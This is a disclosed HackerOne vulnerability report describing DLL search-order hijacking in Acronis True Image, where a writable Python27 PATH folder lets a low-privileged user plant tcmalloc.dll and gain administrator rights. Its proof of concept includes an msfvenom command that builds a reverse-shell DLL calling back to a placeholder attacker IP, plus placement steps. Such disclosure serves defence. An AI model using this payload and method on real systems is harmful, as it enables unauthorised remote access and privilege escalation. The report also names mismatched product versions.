# TrueImage for Acronis True Image 2020 - Untrusted DLL Search-Ordering lead to Privilege Escalation as Administrative account

## Report Details
- **Report ID**: 959017
- **URL**: https://hackerone.com/reports/959017
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-08-14T18:18:16.871Z
- **Disclosed**: 2024-08-27T13:49:50.830Z

## Reporter
- **Username**: vanitas
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: acronis

## Vulnerability Information
Vulnerability Explanation :
	An issue was discovered in Acronis Service Manager Service which intregated from Acronis Cyber Backup ver.15.0.24197. This service is suffered by untrusted search binary. The malicious users who are in “Authenticated Users” group can use malicious DLL file to execute arbitrary code and escalate privilege to impersonate as local administrator.

Vulnerable application version :
	 Acronis Cyber Backup ver.15.0.24197 (maybe lower are affected too).

PoC Operating System version :
	Microsoft Windows 10 Home - 64 bits with latest patched.

Vulnerability found :
1. Executable file : TrueImage.exe.
2. Arbitrary execution using tcmalloc.dll.

Lab Environment :
1. Install Python2.7 for windows, we can see C:\Python27 which is default home application of Python2.7 is added to SYSTEM PATH variable. Open from environment variable. [Ref Picture : 01.jpg, 02.jpg]

Vulnerability Finding :
1. See from Desktop icon : "Acronis True Image" running by execute file : "C:\Program Files (x86)\Acronis\TrueImageHome\TrueImageLauncher.exe". This one has spawned sub-process binary such as : TrueImage.exe
2. Open Process Monitor, to find out how it is doing. Add filter with following criteria : [Ref Picture : 03.jpg]
• Process Name is TrueImage.exe (Include)
• Result contains NOT FOUND (Include)
• Path contains Python27 (Include)
3. From Process Monitor, After we execute Acronis True Image which only administrative running only, we can see suspicious executeable file name as : "tcmalloc.dll" was called from TrueImage.exe and several DLL are called from the path is defined in SYSTEM PATH variable. [Ref Picture : 04.jpg]
4. When closely look for this process details, see that C:\Python27\tcmalloc.dll was loaded by "John" privilege who is local administrator with 32 bits process. [Ref Picture : 05.jpg, 06.jpg]
This is potential to do privilege escalation as Administrative privilege account via untrusted DLL search-ordering exploit

Proof-of-concept exploitation :
1. Use msfvenom tool on Kali-linux to generate malicious DLL file, then save as "tcmalloc.dll". It will generate shellcode to send reverse shell to attacker when this exe is loaded to target system as below command. [Ref Picture : 07.jpg]
Command : 
msfvenom -p windows/shell_reverse_tcp LHOST=[Attacker-IP] LPORT=[Attacker-port] -f dll > tcmalloc.dll
2. On attacker side (Kali-linux). Start reverse shell listener for receive reverse shell.
3. Transfer malicious DLL file to target server, place tcmalloc.dll at C:\Python27. Since this folder is writeable by any of users are in Authenticated Users group, then this low privileged user is allow to place this malicious DLL file on this. [Ref Picture : 08.jpg]
4. Wait for any of administrator account to open Acronis True Image to inject DLL into its main process running.
5. Get reverse shell as user :  John who is local administrator on this host, we can see this reverse shell is spawned by malicious DLL file. [Ref Picture : 09.jpg, 10.jpg, 11.jpg]

## Impact

Malicious users are able to gain privilege escalation permission as local administrator account.

## Attachments
- 01.jpg
- 02.jpg
- 03.jpg
- 04.jpg
- 05.jpg
- 06.jpg
- 07.jpg
- 09.jpg
- 08.jpg
- 10.jpg
- 11.jpg
